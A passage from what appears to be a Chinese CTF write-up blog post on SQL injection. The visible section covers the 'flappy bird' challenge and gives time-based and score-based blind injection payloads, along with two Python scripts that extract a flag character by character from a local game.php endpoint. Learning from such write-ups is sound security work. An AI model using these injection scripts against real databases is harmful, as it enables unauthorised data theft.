+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((...),sleep(5),1)#</span><br></pre></td></tr></table></figure>
+
+<p>来注入,这里我换了一下思路,后面带的是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+if((...),10,1)#</span><br></pre></td></tr></table></figure>
+
+<p>然后如果分数涨了10分,说明正确,否则错误 主要代码如下: 延时注入的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">src</span>):</span><br><span class="line">    src=<span class="built_in">str</span>(src)</span><br><span class="line">    m2=hashlib.md5()</span><br><span class="line">    m2.update(src.encode())</span><br><span class="line">    <span class="keyword">return</span> m2.hexdigest()</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">score=<span class="number">500</span></span><br><span class="line">list1=[<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        score+=<span class="number">1</span></span><br><span class="line">        payload=<span class="string">&#x27;&#123;score&#125; and if(ascii(substr((select flag from flag),</span></span><br><span class="line"><span class="string">        &#123;num&#125;,1))=&#123;ascii_sql&#125;,sleep(3),1)#&#x27;</span>.<span class="built_in">format</span>(score=score,num=num,ascii_sql=<span class="built_in">ord</span>(each))</span><br><span class="line">        check=md5(payload)</span><br><span class="line">        data=&#123;<span class="string">&#x27;score&#x27;</span>:payload,<span class="string">&#x27;check_code&#x27;</span>:check&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(<span class="string">&#x27;http://localhost:8080/flappy/game.php&#x27;</span>,data=data,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag+=each</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>相加脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">src</span>):</span><br><span class="line">    src=<span class="built_in">str</span>(src)</span><br><span class="line">    m2=hashlib.md5()</span><br><span class="line">    m2.update(src.encode())</span><br><span class="line">    <span class="keyword">return</span> m2.hexdigest()</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">r=requests.get(<span class="string">&#x27;http://localhost:8080/flappy/game.php&#x27;</span>)</span><br><span class="line">list1=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        score_now=<span class="built_in">int</span>(re.findall(<span class="string">r&#x27;&lt;strong&gt;(\d+)&lt;/strong&gt;&#x27;</span>,r.text)[<span class="number">0</span>])</span><br><span class="line">        payload=<span class="string">&#x27;&#123;score&#125;+if(ascii(substr((select flag from flag),&#123;num1&#125;,1))=</span></span><br><span class="line"><span class="string">&#123;ascii_sql&#125;,10,1)#&#x27;</span>.<span class="built_in">format</span>(score=score_now,num1=num,ascii_sql=<span class="built_in">ord</span>(each))</span><br><span class="line">        check=md5(payload)</span><br><span class="line">        data=&#123;<span class="string">&#x27;score&#x27;</span>:payload,<span class="string">&#x27;check_code&#x27;</span>:check&#125;</span><br><span class="line">        r=requests.post(<span class="string">&#x27;http://localhost:8080/flappy/game.php&#x27;</span>,data=data)</span><br><span class="line">        r=requests.get(<span class="string">&#x27;http://localhost:8080/flappy/game.php&#x27;</span>)</span><br><span class="line">        score_next=re.findall(<span class="string">r&#x27;&lt;strong&gt;(\d+)&lt;/strong&gt;&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(score_next)-<span class="built_in">int</span>(score_now)==<span class="number">10</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(each))</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#cnss%E9%82%A3%E9%81%93%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">cnss那道题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cnss%E7%9B%B2%E6%B3%A8%E5%88%9D%E4%BD%93%E9%AA%8C"><span class="toc-number">2.</span> <span class="toc-text">cnss盲注初体验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cnss%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%88%9D%E4%BD%93%E9%AA%8C"><span class="toc-number">3.</span> <span class="toc-text">cnss报错注入初体验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cnss-union%E6%B3%A8%E5%88%9D%E4%BD%93%E9%AA%8C"><span class="toc-number">4.</span> <span class="toc-text">cnss union注初体验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cnss%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E5%88%9D%E4%BD%93%E9%AA%8C"><span class="toc-number">5.</span> <span class="toc-text">cnss延时注入初体验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MCTF%E6%B3%A8%E5%85%A51"><span class="toc-number">6.</span> <span class="toc-text">MCTF注入1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flappy-bird"><span class="toc-number">7.</span> <span class="toc-text">flappy bird</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&text=sql注入学习(加mctf小总结)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&title=sql注入学习(加mctf小总结)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&is_video=false&description=sql注入学习(加mctf小总结)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sql注入学习(加mctf小总结)&body=Check out this article: http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&title=sql注入学习(加mctf小总结)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&title=sql注入学习(加mctf小总结)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&title=sql注入学习(加mctf小总结)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&title=sql注入学习(加mctf小总结)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&name=sql注入学习(加mctf小总结)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&t=sql注入学习(加mctf小总结)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    blacsheep
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
